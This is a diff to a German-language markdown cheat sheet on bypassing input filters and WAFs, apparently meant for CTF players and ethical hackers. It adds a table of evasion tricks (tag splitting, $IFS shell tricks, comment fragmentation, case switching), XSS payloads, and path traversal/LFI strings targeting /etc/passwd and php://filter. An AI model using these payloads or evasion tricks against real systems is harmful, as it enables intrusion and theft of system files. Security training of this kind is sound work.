@@ -49,11 +49,11 @@ SELECT CHAR(65,66,67); -- ergibt "ABC"
 Für XSS:
 
 ```html
-<scr<script>ipt>alert(1)</scr<script>ipt>
+<script>alert(1)</script>
 ```
 Oder
 ```html
-<svg/onload=String.fromCharCode(97,108,101,114,116)(1)>
+<svg /onload=String.fromCharCode(97,108,101,114,116)(1)>
 ```
 
 ---
@@ -66,6 +66,14 @@ Oder
 ```bash
 /bin/ba$IFS$IFSsh
 ```
+
+| Technik                    | Beispiel              |
+| -------------------------- | --------------------- |
+| **Splitting**              | `<scr<script>ipt>`    |
+| **Whitespace Tricks**      | `/bin/ba$IFS$IFSsh`   |
+| **Keyword Fragmentierung** | `UNION/**/SELECT`     |
+| **Comments**               | `ec/*x*/ho test`      |
+| **Case Switching**         | `SeLeCt * FrOm users` |
 
 ---
 
@@ -88,6 +96,7 @@ Nützlich bei blind RCE oder SQLi:
 ```bash
 ping -c 5 127.0.0.1
 ```
+
 ---
 
 ## 🧪 Beispiele nach Angriffsart
@@ -104,13 +113,30 @@ ping -c 5 127.0.0.1
 127.0.0.1&&sleep 5
 ```
 
+### 🖼️ Cross-Site Scripting (XSS)
+
+```html
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+<svg/onload=alert(document.domain)>
+```
+
+### 📂 Directory Traversal / LFI
+
+```bash
+../../../../etc/passwd
+....//....//....//etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+```
+
+
 ---
 
 ## 📌 Hinweise
 - Unterschiedliche Filter verlangen unterschiedliche Bypässe. Teste iterativ.
-- In CTFs werden häufig Filter eingebaut – Payload-Crafting ist oft die Lösung.
-- Nutze Burp Suite's Repeater oder Tools wie wfuzz, ffuf, sqlmap für Automatisierung.
-
+- In CTFs werden häufig Custom-Filter eingebaut – Payload-Crafting ist oft die Lösung.
+- Nutze Burp Suite's Repeater oder Tools wie `wfuzz`, `ffuf`, `sqlmap` für Automatisierung.
+- Viele WAFs prüfen nur Signaturen -> ungewöhnliche Kodierungen oder Fragmentierungen helfen oft.
 ---
 
 ## ⚠️ Haftungsausschluss
@@ -126,7 +152,7 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 
 Stay curious – stay secure. 🔐
 
-🗓️ **Letzte Aktualisierung:** Juli 2025  
+🗓️ **Letzte Aktualisierung:** August 2025  
 🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!
 
 ---
@@ -134,3 +160,5 @@ Stay curious – stay secure. 🔐
 ## 🧰 Nützliche Tools
 - [🔍 HackBar (Burp Extension)](https://portswigger.net/bappstore/93c19861f4df4e60bd9d4568cdd97ed6)
 - [🧪 PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [⚡ SecLists (Payload Collections)](https://github.com/danielmiessler/SecLists?utm_source=chatgpt.com)
+- [🔎 FuzzDB (Web Fuzzing Payloads)](https://github.com/fuzzdb-project/fuzzdb?utm_source=chatgpt.com)
